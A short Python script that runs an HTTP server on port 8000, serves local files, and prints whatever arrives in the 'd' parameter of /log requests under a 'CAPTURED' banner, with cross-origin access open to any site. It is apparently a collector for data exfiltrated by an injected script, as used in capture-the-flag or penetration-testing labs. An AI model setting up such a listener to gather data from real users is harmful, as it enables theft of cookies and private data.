from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse

class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if '/log' in self.path:
            qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            print("\n🚩 CAPTURED:", qs.get('d', ['(empty)'])[0])
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
        else:
            super().do_GET()

HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
